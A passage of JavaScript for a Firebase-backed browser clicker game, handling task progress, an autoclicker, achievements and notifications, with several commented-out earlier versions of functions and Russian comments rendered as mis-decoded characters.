    // –û—Ç–º–µ—á–∞–µ–º –∑–∞–¥–∞—á—É –∫–∞–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—É—é
    const completions = (taskData.completions || 0) + 1;
    db.ref(`tasks/${user.uid}/${taskId}`).set({
      progress: task.goal,
      lastReset: taskData.lastReset || new Date().toDateString(),
      completions: completions,
      completed: true
    }).then(() => {
      score += task.reward;
      showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
      updateCounterDisplay();
      submitScore();
      renderTasks();
    }).catch(error => {
      console.error("Error completing task:", error);
      showMessage("Failed to complete task.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}

   function openTwitterLink(url) {
  console.log("Attempting to open Twitter link: " + url);
  try {
    const newWindow = window.open(url, '_blank', 'noopener,noreferrer');
    if (newWindow) {
      console.log("New window opened successfully.");
      newWindow.focus();
    } else {
      console.error("Failed to open new window. Possible popup blocker.");
      showMessage("Unable to open X link. Please disable popup blocker or visit https://x.com/CircleGameTry manually.");
      setTimeout(() => {
        window.location.href = url;
      }, 1000);
    }
  } catch (error) {
    console.error("Error opening Twitter link: ", error);
    showMessage("Error opening X link. Redirecting to https://x.com/CircleGameTry...");
    setTimeout(() => {
      window.location.href = url;
    }, 1000);
  }
}  

    function toggleTasks() {
      const panel = document.getElementById("tasksPanel");
      const btn = document.querySelector("button[onclick='toggleTasks()']");
      const isCurrentlyOpen = panel.classList.contains("open");

      closeAllPanels();

      if (!isCurrentlyOpen) {
        panel.classList.add("open");
        btn.innerHTML = "üìã Tasks ‚ñ≤";
        renderTasks();
      }
    }

     function updateTaskProgress(taskId, increment) {
  if (!user) return;

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∞–∫—Ç–∏–≤–Ω–æ –ª–∏ –∑–∞–¥–∞–Ω–∏–µ
  const weekNumber = getWeekNumber();
  const isEvenWeek = weekNumber % 2 === 0;
  const task = dailyTasks.find(t => t.id === taskId);
  if (task.alternate) {
    if (task.id === "autoclickerMaster" && !isEvenWeek) return;
    if (task.id === "collectBigTokens" && isEvenWeek) return;
  }

  const now = new Date();
  const today = now.toDateString();
  const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();
  const resetKey = task?.period === "weekly" ? startOfWeek : today;

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    let taskData = snapshot.val() || { progress: 0, lastReset: resetKey, completions: 0, completed: false };

    if (taskData.lastReset !== resetKey) {
      taskData = {
        progress: 0,
        lastReset: resetKey,
        completions: 0,
        completed: false,
        ...(task.goalOptions && {
          goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
          reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
        })
      };
    }

    if (taskData.completed || taskData.completions >= 1) {
      return;
    }

    const newProgress = (taskData.progress || 0) + increment;
    const goal = taskId === "collectTokens" || taskId === "collectBigTokens" ? taskData.goal : task.goal;
    taskData.progress = Math.min(newProgress, goal);

    db.ref(`tasks/${user.uid}/${taskId}`).set(taskData).then(() => {
      if (!(taskData.completed || taskData.completions >= 1)) {
        checkTaskCompletion(taskId);
      }
      renderTasks();
    }).catch(error => {
      console.error("Error updating task progress:", error);
      showMessage("Failed to update task progress.");
    });
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
} 
  
/*!function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon" || task.id === "clickMasterWeekly") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          // –ù–∞–≥—Ä–∞–¥–∞ –Ω–∞—á–∏—Å–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ claimTask
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: taskData.progress,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
        });
      }
      renderTasks();
    }
  });
}!*/


  function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (!task || !taskData) {
      console.error("Task or task data not found for taskId:", taskId);
      return;
    }

    if (taskData.completed || (taskData.completions || 0) >= 1) {
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon" || task.id === "clickMasterWeekly") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          // –ù–∞–≥—Ä–∞–¥–∞ –Ω–∞—á–∏—Å–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ claimTask
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        } else if (task.id === "miniGameChallenge") {
          // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –Ω–∞—á–∏—Å–ª–µ–Ω–∏–µ –∫—Ä–∏—Å—Ç–∞–ª–ª–æ–≤
          crystals = (crystals || 0) + task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} üíé`);
          updateProfilePanel();
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: taskData.progress,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
        });
      }
      renderTasks();
    }
  }).catch(error => {
    console.error("Error checking task completion:", error);
    showMessage("Failed to check task completion.");
  });
}


  /*!?!!?  function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData && taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon" || task.id === "clickMasterWeekly") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          // –ù–∞–≥—Ä–∞–¥–∞ –Ω–∞—á–∏—Å–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ claimTask
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true);
          submitScore();
        } else if (task.id === "miniGameChallenge") {
          // –ù–∞–≥—Ä–∞–¥–∞ –Ω–∞—á–∏—Å–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ claimTask
        }
        db.ref(`tasks/${user.uid}/${task.id}`).set({
          progress: taskData.progress,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true,
          ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
        });
      }
      renderTasks();
    }
  });
}?!?*/

document.addEventListener("DOMContentLoaded", function() {
  particlesJS("particles-js", {
    "particles": {
      "number": { "value": 0 }, // –ò–∑–Ω–∞—á–∞–ª—å–Ω–æ —á–∞—Å—Ç–∏—Ü –Ω–µ—Ç
      "color": { "value": "#ffd700" }, // –ó–æ–ª–æ—Ç–æ–π —Ü–≤–µ—Ç
      "shape": { "type": "circle" },
      "size": { "value": 5, "random": true },
      "move": { 
        "enable": true, 
        "speed": 10, 
        "direction": "top", // –ß–∞—Å—Ç–∏—Ü—ã "–≤–∑–ª–µ—Ç–∞—é—Ç" –≤–≤–µ—Ä—Ö
        "out_mode": "out" 
      }
    },
    "interactivity": {
      "events": {
        "onclick": { "enable": false },
        "onhover": { "enable": false }
      }
    }
  });
});

  
      
   /*! function clickToken() {
      score += clickPower;
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("levelUp", clickPower);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();
    }!*/

 /*!!   function clickToken() {

      if (isAnimating) return; // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –∞–Ω–∏–º–∞—Ü–∏—è —É–∂–µ –∏–¥—ë—Ç
        isAnimating = true;
      
  score += clickPower;
  totalClicks++;
  updateTaskProgress("clickMarathon", 1);
  updateTaskProgress("collectTokens", clickPower); // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –¥–ª—è collectTokens
  updateTaskProgress("collectBigTokens", clickPower);
  updateTaskProgress("clickMasterWeekly", 1);    
  checkAchievements();
  updateCounterDisplay();
  updateProfilePanel();
  animateCounter();

// –ê–Ω–∏–º–∞—Ü–∏—è —á–∞—Å—Ç–∏—Ü (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ, —Ç—Ä–µ–±—É–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, particles.js)
  const button = document.getElementById("mainClickButton");
  button.classList.add("pulse");
 // setTimeout(() => button.classList.remove("pulse"), 200);
setTimeout(() => {
    button.classList.remove("pulse");
    isAnimating = false; // –†–∞–∑—Ä–µ—à–∞–µ–º —Å–ª–µ–¥—É—é—â—É—é –∞–Ω–∏–º–∞—Ü–∏—é
  }, 200);
      
      
}!!*/ // animacia

     

function clickToken() {
  if (!user) {
    console.log('User not authenticated, cannot process click.');
    return;
  }

  if (isAnimating) {
    console.log('Animation in progress, skipping click.');
    return; // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –∞–Ω–∏–º–∞—Ü–∏—è —É–∂–µ –∏–¥—ë—Ç
  }
  isAnimating = true;

  // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º score –≤ –±–∞–∑–µ —á–µ—Ä–µ–∑ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
  db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
    console.log(`DB score before transaction: ${currentScore}`);
    return (currentScore || 0) + clickPower;
  }).then(transactionResult => {
    if (transactionResult.committed) {
      score = transactionResult.snapshot.val(); // –û–±–Ω–æ–≤–ª—è–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–π score
      console.log(`After click - Local score updated: ${score}`);

      // –û–±–Ω–æ–≤–ª—è–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Å—á—ë—Ç—á–∏–∫–∏ –∏ –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("collectTokens", clickPower); // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –¥–ª—è collectTokens
      updateTaskProgress("collectBigTokens", clickPower);
      updateTaskProgress("clickMasterWeekly", 1);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();

      

      // –ê–Ω–∏–º–∞—Ü–∏—è —á–∞—Å—Ç–∏—Ü (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ, —Ç—Ä–µ–±—É–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, particles.js)?
      const button = document.getElementById("mainClickButton");
      button.classList.add("pulse");
      setTimeout(() => {
        button.classList.remove("pulse");
        isAnimating = false; // –†–∞–∑—Ä–µ—à–∞–µ–º —Å–ª–µ–¥—É—é—â—É—é –∞–Ω–∏–º–∞—Ü–∏—é
      }, 200);

      // –í—ã–∑—ã–≤–∞–µ–º submitScore —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ–º —á–∞—Å—Ç–æ—Ç—ã
     // submitScoreDebounced();
     
      
    }
  }).catch(error => {
    console.error('Error updating score via transaction:', error);
    isAnimating = false; // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–ª–∞–≥ –∞–Ω–∏–º–∞—Ü–∏–∏ –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
  });
}

  
/*!!!!!function clickToken() {
  if (!user) {
    console.log('User not authenticated, cannot process click.');
    return;
  }

  if (isAnimating) {
    console.log('Animation in progress, skipping click.');
    return; // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –∞–Ω–∏–º–∞—Ü–∏—è —É–∂–µ –∏–¥—ë—Ç
  }
  isAnimating = true;

  // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º score –≤ –±–∞–∑–µ —á–µ—Ä–µ–∑ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
  db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
    console.log(`DB score before transaction: ${currentScore}`);
    return (currentScore || 0) + clickPower;
  }).then(transactionResult => {
    if (transactionResult.committed) {
      score = transactionResult.snapshot.val(); // –û–±–Ω–æ–≤–ª—è–µ–º –ª–æ–∫–∞–ª—å–Ω—ã–π score
      console.log(`After click - Local score updated: ${score}`);

      // –û–±–Ω–æ–≤–ª—è–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Å—á—ë—Ç—á–∏–∫–∏ –∏ –ø—Ä–æ–≥—Ä–µ—Å—Å –∑–∞–¥–∞—á
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("collectTokens", clickPower); // –û–±–Ω–æ–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –¥–ª—è collectTokens
      updateTaskProgress("collectBigTokens", clickPower);
      updateTaskProgress("clickMasterWeekly", 1);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();

      // –ê–Ω–∏–º–∞—Ü–∏—è —á–∞—Å—Ç–∏—Ü —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º particles.js
      if (window.pJSDom && window.pJSDom[0] && window.pJSDom[0].pJS) {
        window.pJSDom[0].pJS.fn.particlesEmpty(); // –û—á–∏—â–∞–µ–º —Ç–µ–∫—É—â–∏–µ —á–∞—Å—Ç–∏—Ü—ã
        window.pJSDom[0].pJS.particles.number.value = 20; // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —á–∞—Å—Ç–∏—Ü
        window.pJSDom[0].pJS.particles.color.value = "#ffd700"; // –ó–æ–ª–æ—Ç–æ–π —Ü–≤–µ—Ç –¥–ª—è —ç—Ñ—Ñ–µ–∫—Ç–∞ –º–æ–Ω–µ—Ç
        window.pJSDom[0].pJS.fn.particlesRefresh(); // –û–±–Ω–æ–≤–ª—è–µ–º —á–∞—Å—Ç–∏—Ü—ã
      } else {
        console.warn("particles.js –Ω–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω –∏–ª–∏ –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω.");
      }

      // –ê–Ω–∏–º–∞—Ü–∏—è –∫–Ω–æ–ø–∫–∏ (pulse)
      const button = document.getElementById("mainClickButton");
      button.classList.add("pulse");
      setTimeout(() => {
        button.classList.remove("pulse");
        isAnimating = false; // –†–∞–∑—Ä–µ—à–∞–µ–º —Å–ª–µ–¥—É—é—â—É—é –∞–Ω–∏–º–∞—Ü–∏—é
      }, 200);

      // –í—ã–∑—ã–≤–∞–µ–º submitScore —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ–º —á–∞—Å—Ç–æ—Ç—ã
      // submitScoreDebounced();
    }
  }).catch(error => {
    console.error('Error updating score via transaction:', error);
    isAnimating = false; // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–ª–∞–≥ –∞–Ω–∏–º–∞—Ü–∏–∏ –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
  });
}!!!!!*/ //iskri

    

    function animateCounter() {
      const counter = document.getElementById('counter');
      counter.classList.add('bounce');
      setTimeout(() => {
        counter.classList.remove('bounce');
      }, 200);
    }

    function checkAchievements() {
      if (!achievements.superClicker && totalClicks >= 10000) {
        achievements.superClicker = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Super Clicker! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      if (!achievements.tokenHoarder && score >= 1000000) {
        achievements.tokenHoarder = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Token Hoarder! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      if (!achievements.level5 && currentLevel >= 5) {
        achievements.level5 = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Level 5 Reached! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }
    }

    function saveAchievements() {
      if (!user) return;
      db.ref("achievements/" + user.uid).set(achievements);
    }

    function toggleShop() {
      const shop = document.getElementById("shop");
      const btn = document.getElementById("shopBtn");
      const isCurrentlyOpen = shop.style.display === "block";

      closeAllPanels();

      shop.style.display = isCurrentlyOpen ? "none" : "block";
      btn.innerHTML = isCurrentlyOpen ? "Shop ‚ñº" : "Shop ‚ñ≤";
    }

  /*!  function startAutoclicker(duration) {
      if (autoclickActive) {
        const remainingTime = Math.max(0, autoclickEndTime - Date.now());
        autoclickEndTime = Date.now() + remainingTime + duration;
        clearInterval(autoclickInterval);
      } else {
        autoclickActive = true;
        autoclickEndTime = Date.now() + duration;
      }

      autoclickInterval = setInterval(() => clickToken(), 1000);
      autoclickerUses++;
      checkAchievements();

      updateProfilePanel();
      submitScore();

      if (user) {
        db.ref("leaderboard/" + user.uid).update({
          autoclickActive: true,
          autoclickEndTime: autoclickEndTime,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("Error saving autoclicker state:", error);
        });
      }

      setTimeout(() => stopAutoclicker(), autoclickEndTime - Date.now());
    }!*/

/*!!    function startAutoclicker(duration, extendTime = false) {
  if (autoclickActive) {
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    if (remainingTime <= 0) {
      // –ï—Å–ª–∏ –≤—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      stopAutoclicker();
    } else if (extendTime) {
      // –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ –≤—Ä–µ–º—è –¥–ª—è –Ω–∞–≥—Ä–∞–¥—ã –∑–∞ –∑–∞–¥–∞–Ω–∏–µ
      autoclickEndTime = Date.now() + remainingTime + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), remainingTime + duration);
    } else {
      // –ó–∞–º–µ–Ω—è–µ–º —Ç–µ–∫—É—â–∏–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä –Ω–æ–≤—ã–º –≤—Ä–µ–º–µ–Ω–µ–º (–ø–æ–∫—É–ø–∫–∞ –∏–ª–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ)
      autoclickEndTime = Date.now() + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => clickToken(), 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }
  } else {
    // –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–æ–≤—ã–π –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
    autoclickInterval = setInterval(() => clickToken(), 1000);
    setTimeout(() => stopAutoclicker(), duration);
  }

  // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Å—á—ë—Ç—á–∏–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –Ω–æ–≤–æ–π –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ (–Ω–µ –ø—Ä–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–∏)
  if (extendTime || duration !== (autoclickEndTime - Date.now())) {
    autoclickerUses++;
    checkAchievements();
    updateTaskProgress("autoclickerMaster", 1); // –£—á–∏—Ç—ã–≤–∞–µ–º –∞–∫—Ç–∏–≤–∞—Ü–∏—é –¥–ª—è –∑–∞–¥–∞–Ω–∏—è
  }

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }
}!!*/// pravilniy



function startAutoclicker(duration, extendTime = false) {
  if (autoclickActive) {
    const remainingTime = Math.max(0, autoclickEndTime - Date.now());
    if (remainingTime <= 0) {
      stopAutoclicker();
    } else if (extendTime) {
      autoclickEndTime = Date.now() + remainingTime + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => {
        clickToken();
        updateTaskProgress("collectBigTokens", clickPower);
      }, 1000);
      setTimeout(() => stopAutoclicker(), remainingTime + duration);
    } else {
      autoclickEndTime = Date.now() + duration;
      clearInterval(autoclickInterval);
      autoclickInterval = setInterval(() => {
        clickToken();
        updateTaskProgress("collectBigTokens", clickPower);
      }, 1000);
      setTimeout(() => stopAutoclicker(), duration);
    }
  } else {
    autoclickActive = true;
    autoclickEndTime = Date.now() + duration;
    autoclickInterval = setInterval(() => {
      clickToken();
      updateTaskProgress("collectBigTokens", clickPower);
    }, 1000);
    setTimeout(() => stopAutoclicker(), duration);
  }

  if (extendTime || duration !== (autoclickEndTime - Date.now())) {
    autoclickerUses++;
    checkAchievements();
    updateTaskProgress("autoclickerMaster", 1);
  }

  updateProfilePanel();
  submitScore();

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: true,
      autoclickEndTime: autoclickEndTime,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving autoclicker state:", error);
    });
  }
}
    
  

    function stopAutoclicker() {
  clearInterval(autoclickInterval);
  autoclickActive = false;
  autoclickEndTime = 0;
  autoclickInterval = null;
  autoclickCooldown = false;
  updateProfilePanel();
  submitScore();
  showMessage("Autoclicker deactivated.");

  if (user) {
    db.ref("leaderboard/" + user.uid).update({
      autoclickActive: false,
      autoclickEndTime: 0,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error updating autoclicker state:", error);
    });
  }
}

function loadNotifications(uid) {
  db.ref(`notifications/${uid}`).once('value').then(snapshot => {
    const notifications = snapshot.val();
    if (notifications) {
      Object.values(notifications).forEach(notification => {
        if (!notification.read) {
          showMessage(notification.message);
          // –û—Ç–º–µ—á–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∫–∞–∫ –ø—Ä–æ—á–∏—Ç–∞–Ω–Ω–æ–µ
          db.ref(`notifications/${uid}/${notification.id}`).update({
            read: true,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error('Error marking notification as read:', error);
          });
        }
      });
    }
  }).catch(error => {
    console.error('Error loading notifications:', error);
  });
}

/*!function loadPlayerData(uid) {
  db.ref("leaderboard/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      score = data.score || 0;
      clickPower = data.clickPower || 1;
      autoclickActive = data.autoclickActive || false;
      autoclickEndTime = data.autoclickEndTime || 0;
      user.referrer_uid = data.referrer_uid || null; // –ó–∞–≥—Ä—É–∂–∞–µ–º —Ä–µ—Ñ–µ—Ä–µ—Ä–∞
      user.referral_bonus_claimed = data.referral_bonus_claimed || false; // –ó–∞–≥—Ä—É–∂–∞–µ–º —Ñ–ª–∞–≥ –±–æ–Ω—É—Å–∞
      const lastUpdate = data.lastUpdate || 0;

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç
      const tempBoostActive = data.tempBoostActive || false;
      const tempBoostEndTime = data.tempBoostEndTime || 0;
      const tempBoostOriginalClickPower = data.tempBoostOriginalClickPower || clickPower;
      const tempBoostAmount = data.tempBoostAmount || 0;

      if (tempBoostActive && tempBoostEndTime > Date.now()) {
        // –í–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –±—É—Å—Ç–∞
        originalClickPower = tempBoostOriginalClickPower;
        clickPower = Math.min(tempBoostOriginalClickPower + tempBoostAmount, 8);
        const remainingDuration = tempBoostEndTime - Date.now();

        // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –æ—Å—Ç–∞–≤—à–µ–≥–æ—Å—è –≤—Ä–µ–º–µ–Ω–∏
        if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
        tempBoostTimeout = setTimeout(() => {
          clickPower = originalClickPower;
          showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
          updateClickPowerBar();
          updateProfilePanel();
          submitScore();

          // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
          db.ref("leaderboard/" + uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
          });
          tempBoostTimeout = null;
        }, remainingDuration);
      } else if (tempBoostActive) {
        // –ï—Å–ª–∏ –±—É—Å—Ç –∏—Å—Ç—ë–∫, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º –µ–≥–æ
        clickPower = tempBoostOriginalClickPower;
        db.ref("leaderboard/" + uid).update({
          tempBoostActive: false,
          tempBoostEndTime: 0,
          tempBoostOriginalClickPower: 0,
          tempBoostAmount: 0,
          clickPower: clickPower,
          lastUpdate: Date.now()
        });
      }

      // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –∞–≤—Ç–æ–∫–ª–∏–∫–µ—Ä
      if (autoclickActive && autoclickEndTime > Date.now()) {
        const elapsedTime = Date.now() - lastUpdate;
        const secondsPassed = Math.floor(elapsedTime / 1000);
        const tokensEarned = secondsPassed * clickPower;
        if (tokensEarned > 0) {
          score += tokensEarned;
          showMessage(`Autoclicker earned ${tokensEarned} tokens while you were away!`);
          updateTaskProgress("collectTokens", tokensEarned); // –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å –¥–ª—è collectTokens
        }
        const remainingTime = autoclickEndTime - Date.now();
        startAutoclicker(remainingTime, false); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = false –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è
      } else if (autoclickActive) {
        autoclickActive = false;
        autoclickEndTime = 0;
        db.ref("leaderboard/" + uid).update({
          autoclickActive: false,
          autoclickEndTime: 0,
          lastUpdate: Date.now()
        });
        stopAutoclicker();
      }

      updateCounterDisplay();
      updateClickPowerBar();
      updateProfilePanel();
      renderAchievements();
      updateClickPowerCostText();
   //   startBonusTimer(); // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –±–æ–Ω—É—Å–∞ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º lastUpdate
    if (user) {
      db.ref("leaderboard/" + uid).update({
        lastUpdate: Date.now()
      });
    }
  }).catch(error => {
    console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –∏–≥—Ä–æ–∫–∞:", error);
    showMessage("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ.");
  });

  db.ref("achievements/" + uid).once("value").then(snapshot => {
    const data = snapshot.val();
    if (data) {
      achievements = data;
      renderAchievements();
    }
  });
}!*/


